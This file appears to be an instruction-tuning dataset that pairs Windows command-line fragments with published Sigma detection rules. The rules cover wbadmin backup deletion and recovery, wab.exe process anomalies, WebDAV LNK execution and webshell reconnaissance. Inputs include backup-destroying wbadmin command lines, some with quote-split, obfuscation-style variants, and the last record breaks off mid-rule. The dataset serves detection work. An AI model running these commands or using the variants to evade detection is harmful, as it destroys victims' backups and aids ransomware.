{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSE \\svchost \\dllhost \\wab \\wabmig \\wab \\wabmig", "output": "title: Wab/Wabmig Unusual Parent Or Child Processes\nid: 63d1ccc0-2a43-4f4b-9289-361b308991ff\nstatus: test\ndescription: Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity\nreferences:\n    - https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-12\nmodified: 2022-09-27\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSE.exe \\svchost.exe \\dllhost.exe \\wab.exe \\wabmig.exe \\wab.exe \\wabmig.exe", "output": "title: Wab/Wabmig Unusual Parent Or Child Processes\nid: 63d1ccc0-2a43-4f4b-9289-361b308991ff\nstatus: test\ndescription: Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity\nreferences:\n    - https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-12\nmodified: 2022-09-27\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe WBADMIN.EXE delete backup keepVersions:0", "output": "title: All Backups Deleted Via Wbadmin.EXE\nid: 639c9081-f482-47d3-a0bd-ddee3d4ecd76\nrelated:\n    - id: 89f75308-5b1b-4390-b2d8-d6b2340efaf8\n      type: derived\nstatus: test\ndescription: |\n    Detects the deletion of all backups or system state backups via \"wbadmin.exe\".\n    This technique is used by numerous ransomware families and actors.\n    This may only be successful on server platforms that have Windows Backup enabled.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/\n    - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'backup' # Also covers \"SYSTEMSTATEBACKUP\"\n        CommandLine|contains: 'keepVersions:0'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe WBADMIN.EXE delete backup keepVer\\\"sions:0\\\"", "output": "title: All Backups Deleted Via Wbadmin.EXE\nid: 639c9081-f482-47d3-a0bd-ddee3d4ecd76\nrelated:\n    - id: 89f75308-5b1b-4390-b2d8-d6b2340efaf8\n      type: derived\nstatus: test\ndescription: |\n    Detects the deletion of all backups or system state backups via \"wbadmin.exe\".\n    This technique is used by numerous ransomware families and actors.\n    This may only be successful on server platforms that have Windows Backup enabled.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/\n    - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'backup' # Also covers \"SYSTEMSTATEBACKUP\"\n        CommandLine|contains: 'keepVersions:0'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin WBADMIN delete backup keepVersions:0", "output": "title: All Backups Deleted Via Wbadmin.EXE\nid: 639c9081-f482-47d3-a0bd-ddee3d4ecd76\nrelated:\n    - id: 89f75308-5b1b-4390-b2d8-d6b2340efaf8\n      type: derived\nstatus: test\ndescription: |\n    Detects the deletion of all backups or system state backups via \"wbadmin.exe\".\n    This technique is used by numerous ransomware families and actors.\n    This may only be successful on server platforms that have Windows Backup enabled.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/\n    - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'backup' # Also covers \"SYSTEMSTATEBACKUP\"\n        CommandLine|contains: 'keepVersions:0'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe WBADMIN.EXE keepVersions:0 delete backup", "output": "title: All Backups Deleted Via Wbadmin.EXE\nid: 639c9081-f482-47d3-a0bd-ddee3d4ecd76\nrelated:\n    - id: 89f75308-5b1b-4390-b2d8-d6b2340efaf8\n      type: derived\nstatus: test\ndescription: |\n    Detects the deletion of all backups or system state backups via \"wbadmin.exe\".\n    This technique is used by numerous ransomware families and actors.\n    This may only be successful on server platforms that have Windows Backup enabled.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/\n    - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'backup' # Also covers \"SYSTEMSTATEBACKUP\"\n        CommandLine|contains: 'keepVersions:0'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe WBADMIN.EXE delete backup keepVersions:0", "output": "title: Windows Backup Deleted Via Wbadmin.EXE\nid: 89f75308-5b1b-4390-b2d8-d6b2340efaf8\nrelated:\n    - id: 639c9081-f482-47d3-a0bd-ddee3d4ecd76\n      type: derived\nstatus: test\ndescription: |\n    Detects the deletion of backups or system state backups via \"wbadmin.exe\".\n    This technique is used by numerous ransomware families and actors.\n    This may only be successful on server platforms that have Windows Backup enabled.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/\n    - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'delete '\n            - 'backup' # Also covers \"SYSTEMSTATEBACKUP\"\n    filter_main_keep_versions:\n        # Note: We exclude this to avoid duplicate alerts with 639c9081-f482-47d3-a0bd-ddee3d4ecd76\n        CommandLine|contains: 'keepVersions:0'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate backup activity from administration scripts and software.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe WBADMIN.EXE delete bac\"kup\" keepVersions:0", "output": "title: Windows Backup Deleted Via Wbadmin.EXE\nid: 89f75308-5b1b-4390-b2d8-d6b2340efaf8\nrelated:\n    - id: 639c9081-f482-47d3-a0bd-ddee3d4ecd76\n      type: derived\nstatus: test\ndescription: |\n    Detects the deletion of backups or system state backups via \"wbadmin.exe\".\n    This technique is used by numerous ransomware families and actors.\n    This may only be successful on server platforms that have Windows Backup enabled.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/\n    - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'delete '\n            - 'backup' # Also covers \"SYSTEMSTATEBACKUP\"\n    filter_main_keep_versions:\n        # Note: We exclude this to avoid duplicate alerts with 639c9081-f482-47d3-a0bd-ddee3d4ecd76\n        CommandLine|contains: 'keepVersions:0'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate backup activity from administration scripts and software.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin WBADMIN delete backup keepVersions:0", "output": "title: Windows Backup Deleted Via Wbadmin.EXE\nid: 89f75308-5b1b-4390-b2d8-d6b2340efaf8\nrelated:\n    - id: 639c9081-f482-47d3-a0bd-ddee3d4ecd76\n      type: derived\nstatus: test\ndescription: |\n    Detects the deletion of backups or system state backups via \"wbadmin.exe\".\n    This technique is used by numerous ransomware families and actors.\n    This may only be successful on server platforms that have Windows Backup enabled.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/\n    - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'delete '\n            - 'backup' # Also covers \"SYSTEMSTATEBACKUP\"\n    filter_main_keep_versions:\n        # Note: We exclude this to avoid duplicate alerts with 639c9081-f482-47d3-a0bd-ddee3d4ecd76\n        CommandLine|contains: 'keepVersions:0'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate backup activity from administration scripts and software.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe delete keepVersions:0 WBADMIN.EXE backup", "output": "title: Windows Backup Deleted Via Wbadmin.EXE\nid: 89f75308-5b1b-4390-b2d8-d6b2340efaf8\nrelated:\n    - id: 639c9081-f482-47d3-a0bd-ddee3d4ecd76\n      type: derived\nstatus: test\ndescription: |\n    Detects the deletion of backups or system state backups via \"wbadmin.exe\".\n    This technique is used by numerous ransomware families and actors.\n    This may only be successful on server platforms that have Windows Backup enabled.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/\n    - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'delete '\n            - 'backup' # Also covers \"SYSTEMSTATEBACKUP\"\n    filter_main_keep_versions:\n        # Note: We exclude this to avoid duplicate alerts with 639c9081-f482-47d3-a0bd-ddee3d4ecd76\n        CommandLine|contains: 'keepVersions:0'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate backup activity from administration scripts and software.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe WBADMIN.EXE recovery recoveryTarget itemtype:File", "output": "title: File Recovery From Backup Via Wbadmin.EXE\nid: 6fe4aa1e-0531-4510-8be2-782154b73b48\nrelated:\n    - id: 84972c80-251c-4c3a-9079-4f00aad93938\n      type: derived\nstatus: test\ndescription: |\n    Detects the recovery of files from backups via \"wbadmin.exe\".\n    Attackers can restore sensitive files such as NTDS.DIT or Registry Hives from backups in order to potentially extract credentials.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-recovery\n    - https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' recovery'\n            - 'recoveryTarget'\n            - 'itemtype:File'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe WBADMIN.EXE \"recovery\" \"recoveryTarget\" itemtype:File", "output": "title: File Recovery From Backup Via Wbadmin.EXE\nid: 6fe4aa1e-0531-4510-8be2-782154b73b48\nrelated:\n    - id: 84972c80-251c-4c3a-9079-4f00aad93938\n      type: derived\nstatus: test\ndescription: |\n    Detects the recovery of files from backups via \"wbadmin.exe\".\n    Attackers can restore sensitive files such as NTDS.DIT or Registry Hives from backups in order to potentially extract credentials.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-recovery\n    - https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' recovery'\n            - 'recoveryTarget'\n            - 'itemtype:File'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin WBADMIN recovery recoveryTarget itemtype:File", "output": "title: File Recovery From Backup Via Wbadmin.EXE\nid: 6fe4aa1e-0531-4510-8be2-782154b73b48\nrelated:\n    - id: 84972c80-251c-4c3a-9079-4f00aad93938\n      type: derived\nstatus: test\ndescription: |\n    Detects the recovery of files from backups via \"wbadmin.exe\".\n    Attackers can restore sensitive files such as NTDS.DIT or Registry Hives from backups in order to potentially extract credentials.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-recovery\n    - https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' recovery'\n            - 'recoveryTarget'\n            - 'itemtype:File'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wbadmin.exe WBADMIN.EXE recovery recoveryTarget itemtype:File", "output": "title: File Recovery From Backup Via Wbadmin.EXE\nid: 6fe4aa1e-0531-4510-8be2-782154b73b48\nrelated:\n    - id: 84972c80-251c-4c3a-9079-4f00aad93938\n      type: derived\nstatus: test\ndescription: |\n    Detects the recovery of files from backups via \"wbadmin.exe\".\n    Attackers can restore sensitive files such as NTDS.DIT or Registry Hives from backups in order to potentially extract credentials.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-recovery\n    - https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2024-05-10\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' recovery'\n            - 'recoveryTarget'\n            - 'itemtype:File'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\DavWWWRoot\\", "output": "title: Potentially Suspicious WebDAV LNK Execution\nid: 1412aa78-a24c-4abd-83df-767dfb2c5bbe\nrelated:\n    - id: f0507c0f-a3a2-40f5-acc6-7f543c334993\n      type: similar\nstatus: test\ndescription: Detects possible execution via LNK file accessed on a WebDAV server.\nreferences:\n    - https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html\n    - https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462\nauthor: Micah Babinski\ndate: 2023-08-21\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1204\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\explorer.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        CommandLine|contains: '\\DavWWWRoot\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\cmd.exe \\\"\\cscript.exe\\\" \\mshta.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\DavWWWRoot\\", "output": "title: Potentially Suspicious WebDAV LNK Execution\nid: 1412aa78-a24c-4abd-83df-767dfb2c5bbe\nrelated:\n    - id: f0507c0f-a3a2-40f5-acc6-7f543c334993\n      type: similar\nstatus: test\ndescription: Detects possible execution via LNK file accessed on a WebDAV server.\nreferences:\n    - https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html\n    - https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462\nauthor: Micah Babinski\ndate: 2023-08-21\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1204\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\explorer.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        CommandLine|contains: '\\DavWWWRoot\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer \\cmd \\cscript \\mshta \\powershell \\pwsh \\wscript \\DavWWWRoot\\", "output": "title: Potentially Suspicious WebDAV LNK Execution\nid: 1412aa78-a24c-4abd-83df-767dfb2c5bbe\nrelated:\n    - id: f0507c0f-a3a2-40f5-acc6-7f543c334993\n      type: similar\nstatus: test\ndescription: Detects possible execution via LNK file accessed on a WebDAV server.\nreferences:\n    - https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html\n    - https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462\nauthor: Micah Babinski\ndate: 2023-08-21\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1204\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\explorer.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        CommandLine|contains: '\\DavWWWRoot\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\DavWWWRoot\\", "output": "title: Potentially Suspicious WebDAV LNK Execution\nid: 1412aa78-a24c-4abd-83df-767dfb2c5bbe\nrelated:\n    - id: f0507c0f-a3a2-40f5-acc6-7f543c334993\n      type: similar\nstatus: test\ndescription: Detects possible execution via LNK file accessed on a WebDAV server.\nreferences:\n    - https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html\n    - https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462\nauthor: Micah Babinski\ndate: 2023-08-21\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1204\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\explorer.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        CommandLine|contains: '\\DavWWWRoot\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\caddy.exe \\httpd.exe \\nginx.exe \\php-cgi.exe \\w3wp.exe \\ws_tomcatservice.exe \\java.exe \\javaw.exe \\java.exe \\javaw.exe CATALINA_HOME catalina.jar perl --help perl -h python --help python -h python3 --help python3 -h wget --help", "output": "title: Webshell Tool Reconnaissance Activity\nid: f64e5c19-879c-4bae-b471-6d84c8339677\nstatus: test\ndescription: |\n    Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands\nreferences:\n    - https://ragged-lab.blogspot.com/2020/07/webshells-automating-reconnaissance.html\nauthor: Cian Heasley, Florian Roth (Nextron Systems)\ndate: 2020-07-22\nmodified: 2023-11-09\ntags:\n    - attack.persistence\n    - attack.t1505.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_webserver_image:\n        ParentImage|endswith:\n            - '\\caddy.exe'\n            - 